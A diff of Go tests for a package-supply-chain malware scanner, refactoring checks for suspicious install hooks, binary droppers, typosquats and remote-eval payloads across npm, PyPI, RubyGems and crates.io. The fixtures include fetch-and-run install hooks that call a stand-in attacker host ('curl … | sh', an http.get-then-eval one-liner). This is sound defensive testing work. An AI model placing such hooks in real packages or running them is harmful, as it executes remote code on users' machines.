@@ -44,8 +44,10 @@ func TestIncidents_NPM(t *testing.T) {
 				"postinstall": "curl -sSL http://attacker.example.com/x | sh"
 			}
 		}`)
-		got := DetectSuspiciousInstallHook(manifest)
-		if got != domain.CapInstallHookSuspicious {
+		p := &npmParser{}
+		pkg := p.Parse("totally-legit", manifest, usecase.PackageSource{Manifest: manifest})
+		got := checkInstallHooks(pkg)
+		if !hasCap(got, domain.CapInstallHookSuspicious) {
 			t.Fatalf("want CapInstallHookSuspicious, got %v", got)
 		}
 	})
@@ -61,20 +63,23 @@ func TestIncidents_NPM(t *testing.T) {
 				"preinstall": "IFS=$'\\n\\t'; node -e 'require(\"./node_modules/.bin/cli.js\")'"
 			}
 		}`)
-		hookCap := DetectSuspiciousInstallHook(manifest)
-		if hookCap != domain.CapInstallHookSuspicious {
-			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCap)
+		p := &npmParser{}
+		pkg := p.Parse("ua-parser-js", manifest, usecase.PackageSource{Manifest: manifest})
+		hookCaps := checkInstallHooks(pkg)
+		if !hasCap(hookCaps, domain.CapInstallHookSuspicious) {
+			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCaps)
 		}
 
 		// Now the binary it would have dropped:
-		droppedSrc := usecase.PackageSource{
+		droppedPkg := NormalizedPackage{
+			Eco: domain.EcoNpm,
 			Files: map[string][]byte{
 				"jsextension.exe": []byte("MZ\x90\x00stub-binary-payload"),
 			},
 		}
-		dropCap := DetectBinaryDropper(domain.EcoNpm, droppedSrc)
-		if dropCap != domain.CapBinaryDropper {
-			t.Fatalf("binary dropper: want CapBinaryDropper, got %v", dropCap)
+		dropCaps := checkBinaryDropper(droppedPkg)
+		if !hasCap(dropCaps, domain.CapBinaryDropper) {
+			t.Fatalf("binary dropper: want CapBinaryDropper, got %v", dropCaps)
 		}
 	})
 
@@ -88,13 +93,15 @@ func TestIncidents_NPM(t *testing.T) {
 				"postinstall": "node -e \"require('http').get('http://attacker.example/p').on('data',d=>eval(d.toString()))\""
 			}
 		}`)
-		hookCap := DetectSuspiciousInstallHook(manifest)
-		if hookCap != domain.CapInstallHookSuspicious {
-			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCap)
+		p := &npmParser{}
+		pkg := p.Parse("", manifest, usecase.PackageSource{Manifest: manifest})
+		hookCaps := checkInstallHooks(pkg)
+		if !hasCap(hookCaps, domain.CapInstallHookSuspicious) {
+			t.Fatalf("install hook: want CapInstallHookSuspicious, got %v", hookCaps)
 		}
 
 		// The companion source-file shape that pulled from Pastebin clones:
-		src := usecase.PackageSource{
+		srcPkg := NormalizedPackage{
 			Files: map[string][]byte{
 				"compile.js": []byte(`
 					const x = require('https');
@@ -106,7 +113,7 @@ func TestIncidents_NPM(t *testing.T) {
 				`),
 			},
 		}
-		caps := DetectSourcePatterns(src)
+		caps := checkSourcePatterns(srcPkg)
 		if !hasCap(caps, domain.CapObfuscatedPayload) {
 			t.Errorf("want CapObfuscatedPayload (eval(Buffer.from('base64'))), got %v", caps)
 		}
@@ -119,15 +126,15 @@ func TestIncidents_NPM(t *testing.T) {
 		// Generic typosquat shape repeatedly seen on npm: lodahs, expresss,
 		// reactt, etc. Real-world examples include `ts-node-prismaa` and
 		// dozens of lodash variants pulled by name-grafters.
-		got := DetectTyposquat(domain.EcoNpm, "lodahs")
-		if got != domain.CapTyposquatRisk {
+		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoNpm, Name: "lodahs"})
+		if !hasCap(got, domain.CapTyposquatRisk) {
 			t.Fatalf("want CapTyposquatRisk for lodahs (typo of lodash), got %v", got)
 		}
 	})
 
 	t.Run("typosquat_expresss — duplicated trailing letter", func(t *testing.T) {
-		got := DetectTyposquat(domain.EcoNpm, "expresss")
-		if got != domain.CapTyposquatRisk {
+		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoNpm, Name: "expresss"})
+		if !hasCap(got, domain.CapTyposquatRisk) {
 			t.Fatalf("want CapTyposquatRisk for expresss (typo of express), got %v", got)
 		}
 	})
@@ -179,13 +186,7 @@ func TestIncidents_PyPI(t *testing.T) {
 		// and ~/.ssh/* to a fixed h.4.5.6.7-ish IP. Public write-up shows a
 		// concrete C2 hostname; we use a stand-in here that hits our
 		// blocklist (ipinfo.io was a similar shape used in the wild).
-		//
-		// Plans A + C (detection-gaps-roadmap): URL scan now runs over
-		// .py, and pythonObfuscatedPayloadPattern catches the
-		// exec(urlopen(...)) / exec(base64.b64decode(...)) shapes.
-		// The torchtriton fixture below trips the URL scan via
-		// ipinfo.io (already on the suspicious-host blocklist).
-		src := usecase.PackageSource{
+		pkg := NormalizedPackage{
 			Files: map[string][]byte{
 				"triton/runtime/jit.py": []byte(`
 					import urllib.request, os
@@ -194,7 +195,7 @@ func TestIncidents_PyPI(t *testing.T) {
 				`),
 			},
 		}
-		caps := DetectSourcePatterns(src)
+		caps := checkSourcePatterns(pkg)
 		if !hasCap(caps, domain.CapSuspiciousURL) {
 			t.Fatalf("want CapSuspiciousURL (ipinfo.io exfil), got %v", caps)
 		}
@@ -205,8 +206,8 @@ func TestIncidents_PyPI(t *testing.T) {
 		// hijacker that swapped Bitcoin addresses. Levenshtein-1 from the
 		// real package. Plans D + E (detection-gaps-roadmap) added a
 		// per-ecosystem typosquat map and a curated PyPI top-list.
-		got := DetectTyposquat(domain.EcoPyPI, "colourama")
-		if got != domain.CapTyposquatRisk {
+		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoPyPI, Name: "colourama"})
+		if !hasCap(got, domain.CapTyposquatRisk) {
 			t.Fatalf("want CapTyposquatRisk for colourama, got %v", got)
 		}
 	})
@@ -217,14 +218,15 @@ func TestIncidents_PyPI(t *testing.T) {
 		// gaps-roadmap) added PyPI-aware nuance: .cpython-*.so / .abi3.so /
 		// .pyd / <pkg>/.libs/ paths are carved out as legitimate C-ext
 		// shapes; a stray binary outside those paths flags.
-		src := usecase.PackageSource{
+		pkg := NormalizedPackage{
+			Eco: domain.EcoPyPI,
 			Files: map[string][]byte{
 				"ultralytics/__init__.py":          []byte("from . import data"),
 				"ultralytics/data/.cache/xmrig.so": []byte("ELF\x7fdrop"),
 			},
 		}
-		got := DetectBinaryDropper(domain.EcoPyPI, src)
-		if got != domain.CapBinaryDropper {
+		got := checkBinaryDropper(pkg)
+		if !hasCap(got, domain.CapBinaryDropper) {
 			t.Fatalf("want CapBinaryDropper for stray .so outside C-ext paths, got %v", got)
 		}
 	})
@@ -241,12 +243,7 @@ func TestIncidents_RubyGems(t *testing.T) {
 		// pushed a version that ran `eval(Net::HTTP.get(...))` to fetch
 		// and execute remote code at require-time. The literal pattern
 		// is the spiritual ancestor of every "decode-then-execute" rule.
-		//
-		// Plan B (detection-gaps-roadmap): rubyObfuscatedPayloadPattern
-		// covers Ruby's canonical fetch-then-execute idiom; URL scan now
-		// runs over .rb (Plan A). Together they catch the rest-client
-		// shape on both axes.
-		src := usecase.PackageSource{
+		pkg := NormalizedPackage{
 			Files: map[string][]byte{
 				"lib/restclient/version.rb": []byte(`
 					require 'net/http'
@@ -254,7 +251,7 @@ func TestIncidents_RubyGems(t *testing.T) {
 				`),
 			},
 		}
-		caps := DetectSourcePatterns(src)
+		caps := checkSourcePatterns(pkg)
 		if !hasCap(caps, domain.CapObfuscatedPayload) {
 			t.Errorf("want CapObfuscatedPayload (eval(http_get)), got %v", caps)
 		}
@@ -267,7 +264,7 @@ func TestIncidents_RubyGems(t *testing.T) {
 		// strong_password@0.0.7 (Jun 2019): same attacker as rest-client.
 		// Loaded a remote payload from pastebin via `eval(...)` and
 		// would have backdoored Rails apps that picked up the gem.
-		src := usecase.PackageSource{
+		pkg := NormalizedPackage{
 			Files: map[string][]byte{
 				"lib/strong_password/strength_checker.rb": []byte(`
 					def initialize
@@ -276,7 +273,7 @@ func TestIncidents_RubyGems(t *testing.T) {
 				`),
 			},
 		}
-		caps := DetectSourcePatterns(src)
+		caps := checkSourcePatterns(pkg)
 		if !hasCap(caps, domain.CapObfuscatedPayload) {
 			t.Errorf("want CapObfuscatedPayload, got %v", caps)
 		}
@@ -311,8 +308,8 @@ func TestIncidents_Crates(t *testing.T) {
 		// underscore vs no-underscore). Embedded a payload that looked for
 		// CI tokens in env and posted them outbound. Plans D + F unblocked
 		// this — per-ecosystem typosquat map + curated crates.io top-list.
-		got := DetectTyposquat(domain.EcoCrates, "rustdecimal")
-		if got != domain.CapTyposquatRisk {
+		got := checkTyposquat(NormalizedPackage{Eco: domain.EcoCrates, Name: "rustdecimal"})
+		if !hasCap(got, domain.CapTyposquatRisk) {
 			t.Fatalf("want CapTyposquatRisk for rustdecimal, got %v", got)
 		}
 	})
@@ -349,15 +346,16 @@ build = "build.rs"`),
 		// heuristic to crates: legitimate -sys crates ship .a / .lib
 		// (not on the suspiciousBinary list); precompiled .so / .dll /
 		// .dylib in a crate is the malware pattern.
-		src := usecase.PackageSource{
+		pkg := NormalizedPackage{
+			Eco: domain.EcoCrates,
 			Files: map[string][]byte{
 				"Cargo.toml":  []byte(`[package]\nname = "big_decimal"`),
 				"src/lib.rs":  []byte(`pub fn add(a: i32, b: i32) -> i32 { a + b }`),
 				"native/x.so": []byte("ELF\x7fpayload"),
 			},
 		}
-		got := DetectBinaryDropper(domain.EcoCrates, src)
-		if got != domain.CapBinaryDropper {
+		got := checkBinaryDropper(pkg)
+		if !hasCap(got, domain.CapBinaryDropper) {
 			t.Fatalf("want CapBinaryDropper for crate-shipped .so, got %v", got)
 		}
 	})
@@ -380,7 +378,7 @@ func TestIncidents_NPM_MiniShaiHulud(t *testing.T) {
 	}`)
 
 	// Synthetic router_init.js: inert JS padded to 600 KB — above the
-	// 512 KB threshold so DetectUnlistedPayload fires. Not real malware.
+	// 512 KB threshold so checkUnlistedPayload fires. Not real malware.
 	routerInitBody := make([]byte, 600_000)
 	copy(routerInitBody, []byte("// synthetic-ioc-fixture\n"))
 
@@ -393,30 +391,33 @@ func TestIncidents_NPM_MiniShaiHulud(t *testing.T) {
 		Manifest: manifest,
 	}
 
+	p := &npmParser{}
+	pkg := p.Parse("@tanstack/react-router", manifest, src)
+
 	t.Run("CapGitDepInOptionalDep fires", func(t *testing.T) {
-		got := DetectGitDepInOptional(manifest)
-		if got != domain.CapGitDepInOptionalDep {
+		got := checkOptionalGitDep(pkg)
+		if !hasCap(got, domain.CapGitDepInOptionalDep) {
 			t.Fatalf("want CapGitDepInOptionalDep, got %v", got)
 		}
 	})
 
 	t.Run("CapInstallHookSuspicious fires (bun run && exit 1)", func(t *testing.T) {
-		got := DetectSuspiciousInstallHook(manifest)
-		if got != domain.CapInstallHookSuspicious {
+		got := checkInstallHooks(pkg)
+		if !hasCap(got, domain.CapInstallHookSuspicious) {
 			t.Fatalf("want CapInstallHookSuspicious, got %v", got)
 		}
 	})
 
 	t.Run("CapKnownMalwareIOC fires (router_init.js)", func(t *testing.T) {
-		caps := DetectSourcePatterns(src)
+		caps := checkSourcePatterns(pkg)
 		if !hasCap(caps, domain.CapKnownMalwareIOC) {
 			t.Fatalf("want CapKnownMalwareIOC in %v", caps)
 		}
 	})
 
 	t.Run("CapUnlistedLargeFile fires (600 KB at root, not in files)", func(t *testing.T) {
-		got := DetectUnlistedPayload(manifest, src)
-		if got != domain.CapUnlistedLargeFile {
+		got := checkUnlistedPayload(pkg)
+		if !hasCap(got, domain.CapUnlistedLargeFile) {
 			t.Fatalf("want CapUnlistedLargeFile, got %v", got)
 		}
 	})
